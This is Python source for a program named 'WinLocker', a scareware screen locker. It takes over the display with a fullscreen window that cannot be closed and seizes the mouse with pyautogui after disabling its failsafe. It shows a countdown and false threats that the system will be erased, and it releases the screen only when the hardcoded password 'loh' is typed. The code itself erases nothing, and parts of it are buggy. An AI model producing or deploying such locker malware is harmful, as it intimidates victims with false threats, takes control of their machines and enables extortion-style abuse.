from tkinter import *
from pyautogui import click, moveTo
import pyautogui
import pygame

pyautogui.FAILSAFE = False


class WinLocker:
    def __init__(self, title, time_in_sec, pswrd):
        self.time_in_sec = time_in_sec
        self.pswrd = pswrd

        self.screen = Tk()
        self.screen.title(title)
        self.screen.attributes("-fullscreen", True)
        self.screen.configure(background='#1c1c1c')

        self.field = Entry(self.screen, fg="black", justify=CENTER)

        self.button = Button(self.screen, text="Unlock")
        self.button.bind('<Button-1>', self.password_check())
        self.screen.protocol("WM_DELETE_WINDOW", self.block)

        self.info_message = Label(self.screen, text='Your system is blocked!', font="TimesNewRoman 30", fg="#32CD32", bg="#1c1c1c")
        self.success_message = Label(self.screen, text="Your system saved!", font="TimesNewRoman 30", fg="#32CD32", bg="#1c1c1c")
        self.delete_message = Label(self.screen, text='Erasing your system...', font="TimesNewRoman 30", fg="#32CD32", bg="#1c1c1c")
        self.warn_message = Label(self.screen, text="If you reboot your PC your data will be erased!", font="TimesNewRoman 16", fg="red", bg="#1c1c1c")
        self.countdown_message = Label(self.screen, text='Your system will be erased after: ', fg="white", bg="#1c1c1c", font="Arial 15")
        self.time_message = Label(text=time_in_sec)

        self.field.place(width=150, height=50, x=600, y=300)
        self.button.place(width=150, height=50, x=600, y=380)
        self.warn_message.place(x=410, y=100)
        self.info_message.place(x=455, y=195)
        self.time_message.place(x=20, y=100)
        self.countdown_message.place(x=20, y=70)

        self.screen.update()
        click(x=675, y=325)
        moveTo(x=660, y=410)

    def block(self, x=675, y=405):
        click(x=x, y=y)
        moveTo(x=x, y=y)
        self.screen.update()

    def password_check(self):
        user_input = self.field.get()
        if self.pswrd in user_input:
            return True

    def run(self):

        while not self.password_check() and self.time_in_sec != 0:
            self.time_message.configure(text=self.time_in_sec)
            self.screen.after(100)
            self.time_in_sec -= 1
            self.block()
        else:
            self.screen.destroy()


if __name__ == "__main__":
    locker = WinLocker(title="Oleja", time_in_sec=100, pswrd='loh')
    locker.run()